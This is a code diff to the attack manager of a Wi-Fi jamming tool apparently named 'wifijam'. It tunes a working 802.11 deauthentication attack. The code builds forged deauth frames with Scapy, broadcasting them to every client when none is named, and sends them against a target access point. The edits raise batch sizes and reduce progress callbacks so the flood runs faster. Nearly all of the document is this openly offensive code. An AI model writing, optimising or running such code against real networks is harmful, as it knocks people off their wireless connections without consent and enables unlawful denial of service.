@@ -15,6 +15,13 @@ from wifijam.core.exceptions import AttackError, UnsupportedPlatformError, Permi
 from wifijam.wifi.adapter import WiFiAdapter
 from wifijam.wifi.scanner import Network
 
+# Pre-import scapy if available to avoid runtime import delays
+try:
+    from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+    SCAPY_AVAILABLE = True
+except ImportError:
+    SCAPY_AVAILABLE = False
+
 logger = get_logger(__name__)
 
 
@@ -167,10 +174,15 @@ class AttackManager:
                     stderr=subprocess.PIPE
                 )
                 
-                # Monitor process
+                # Monitor process with adaptive sleep
+                update_interval = 0.5
+                last_update = time.time()
                 while self.is_attacking and self.attack_process.poll() is None:
-                    time.sleep(0.5)
-                    self.packets_sent += 10  # Estimate
+                    time.sleep(update_interval)
+                    current_time = time.time()
+                    elapsed = current_time - last_update
+                    self.packets_sent += int(elapsed * 20)  # Estimate based on elapsed time
+                    last_update = current_time
                     
                     if self.progress_callback:
                         self.progress_callback(self.packets_sent, -1)
@@ -182,8 +194,9 @@ class AttackManager:
                     stderr=subprocess.PIPE
                 )
                 
-                # Monitor progress
+                # Monitor progress with batched updates
                 start_time = time.time()
+                update_interval = 0.2  # Update less frequently
                 while self.is_attacking and self.attack_process.poll() is None:
                     elapsed = time.time() - start_time
                     estimated_packets = int(elapsed * 10)  # Rough estimate
@@ -192,7 +205,7 @@ class AttackManager:
                     if self.progress_callback:
                         self.progress_callback(self.packets_sent, config.packet_count)
                     
-                    time.sleep(0.1)
+                    time.sleep(update_interval)
                 
                 self.attack_process.wait(timeout=30)
             
@@ -211,7 +224,8 @@ class AttackManager:
     def _deauth_with_scapy(self, config: AttackConfig) -> None:
         """Deauth using Scapy."""
         try:
-            from scapy.all import RadioTap, Dot11, Dot11Deauth, sendp
+            if not SCAPY_AVAILABLE:
+                raise AttackError("Scapy not installed. Install with: pip install scapy")
             
             # Set channel
             subprocess.run(
@@ -223,7 +237,7 @@ class AttackManager:
             # Determine client MAC
             client = config.client_mac if config.client_mac else "ff:ff:ff:ff:ff:ff"
             
-            # Create deauth packet
+            # Create deauth packet once (reuse for efficiency)
             packet = RadioTap() / Dot11(
                 addr1=client,
                 addr2=config.target_bssid,
@@ -232,36 +246,47 @@ class AttackManager:
             
             logger.info(f"Sending deauth packets with Scapy")
             
-            # Send packets
+            # Send packets with optimized batching
             if config.continuous:
+                batch_size = 20  # Increased batch size for better performance
+                update_interval = 1.0  # Update callback less frequently
                 while self.is_attacking:
-                    sendp(packet, iface=self.adapter.interface, count=10, inter=config.delay_ms/1000, verbose=0)
-                    self.packets_sent += 10
+                    sendp(packet, iface=self.adapter.interface, count=batch_size, 
+                          inter=config.delay_ms/1000, verbose=0)
+                    self.packets_sent += batch_size
                     
                     if self.progress_callback:
                         self.progress_callback(self.packets_sent, -1)
                     
-                    time.sleep(0.5)
+                    time.sleep(update_interval)
             else:
-                packets_per_batch = 10
+                packets_per_batch = 20  # Increased batch size
                 batches = config.packet_count // packets_per_batch
+                remainder = config.packet_count % packets_per_batch
                 
                 for i in range(batches):
                     if not self.is_attacking:
                         break
                     
-                    sendp(packet, iface=self.adapter.interface, count=packets_per_batch, inter=config.delay_ms/1000, verbose=0)
+                    sendp(packet, iface=self.adapter.interface, count=packets_per_batch, 
+                          inter=config.delay_ms/1000, verbose=0)
                     self.packets_sent += packets_per_batch
                     
-                    if self.progress_callback:
+                    # Only update callback every few batches for efficiency
+                    if i % 5 == 0 and self.progress_callback:
                         self.progress_callback(self.packets_sent, config.packet_count)
-                    
-                    time.sleep(0.1)
+                
+                # Send remaining packets
+                if remainder > 0 and self.is_attacking:
+                    sendp(packet, iface=self.adapter.interface, count=remainder,
+                          inter=config.delay_ms/1000, verbose=0)
+                    self.packets_sent += remainder
+                
+                if self.progress_callback:
+                    self.progress_callback(self.packets_sent, config.packet_count)
             
             logger.info(f"Deauth attack completed. Sent {self.packets_sent} packets")
         
-        except ImportError:
-            raise AttackError("Scapy not installed. Install with: pip install scapy")
         except Exception as e:
             logger.error(f"Error in scapy deauth: {e}")
             raise
